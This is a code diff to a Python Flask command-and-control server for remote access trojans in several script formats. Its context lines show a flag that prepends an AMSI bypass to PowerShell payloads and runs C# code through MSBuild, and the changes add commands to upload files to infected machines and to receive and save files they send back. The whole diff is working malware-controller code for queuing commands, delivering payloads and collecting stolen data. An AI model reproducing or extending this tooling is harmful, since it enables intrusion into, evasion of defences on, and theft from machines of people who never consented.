@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
+
 from flask import Flask, request
 from datetime import datetime
 from itertools import cycle
 from pathlib import Path
+
 import threading
 import argparse
 import readline
 import logging
+import random
 import base64
 import time
 import json
@@ -28,6 +31,7 @@ ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
+alpha = "abcdefghijklmnopqrstuvwxyz"
 
 # Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
@@ -125,6 +129,12 @@ def send_ratcode(ratID):
         else:
             ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
             return(ratcode)
+
+def encode_file(filepath):
+    with open(Path(filepath).resolve() , "rb") as fd:
+        data = fd.read()
+    b64data = base64.b64encode(data).decode('utf-8')
+    return(b64data)   
 
 def create_psscript(filepath, extra_cmds=""):
     with open(Path(filepath).resolve() , "r") as fd:
@@ -281,6 +291,13 @@ def serve_server(port=8080):
             print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
 
+        if("dl" in post_dict.keys()):
+            commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
+            rand = ''.join(random.choice(alpha) for choice in range(10)) 
+            with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
+                fd.write(base64.b64decode(post_dict['dl']))
+            print("\n[*] File download from rat " + colors(ratID) + " saved to downloads/" + colors(ratID) + "." + rand)
+
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
@@ -432,19 +449,34 @@ if __name__ == "__main__":
                             else:
                                 inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                         except:
-                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
+                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                             continue
 
-                    elif(str.startswith(inp, "cs ")):
-                        #try:
-                        filepath = inp.split(" ")[1]
-                        if(types[ratID] == "ps1"):
-                            inp = "cs " + send_invoke_assembly(inp)
-                        else:
-                            inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
-                        #except:
-                        #    print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
-                        #    continue
+                    elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
+                        try:
+                            filepath = inp.split(" ")[1]
+                            if(types[ratID] == "ps1"):
+                                inp = "cs " + send_invoke_assembly(inp)
+                            else:
+                                inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
+                        except:
+                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                            continue
+
+                    elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
+                        try:
+                            localpath = inp.split(" ")[1]
+                            remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
+                            remotepath = remotepath.replace("\\", "\\\\")
+                            inp = "up " + encode_file(localpath) + " " + remotepath
+                        except:
+                            print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
+                            continue
+
+                    # Alias download=dl
+                    elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
+                        inp = " ".join(inp.split(" ")[1:])
+                        inp = "dl " + inp
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
